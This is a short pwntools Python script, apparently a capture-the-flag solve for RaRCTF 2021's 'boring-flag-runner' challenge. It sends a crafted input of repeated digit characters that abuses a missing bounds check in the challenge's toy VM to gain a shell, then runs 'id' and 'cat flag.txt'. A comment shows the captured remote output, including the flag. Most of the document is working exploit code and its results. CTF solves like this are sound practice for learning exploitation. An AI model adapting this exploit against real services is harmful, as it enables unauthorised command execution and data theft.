from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './boring-flag-checker'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 31022
  s = remote(HOST, PORT)
else:
  s = process("./start.sh", shell=True)

s.recvuntil("enter your program: ")

#buf = "0"*312+"7"*0x3e+"0"+"6"*6+"0"+"7"*12

buf = "0"*312+"6"*0x32+"0"+"6"*4+"0"+"7"*12

s.sendline(buf)

s.sendline("id 1>&2")

s.sendline("cat flag.txt 1>&2")

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_boring-flag-runner_300$ python3 solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_boring-flag-runner_300/boring-flag-checker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 193.57.159.27 on port 31022: Done
[*] Switching to interactive mode
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
rarctf{my_br41nf$%k_vm_d03snt_c4r3_f0r_s1lly_b0unds-ch3ck5_56fc255324}
'''
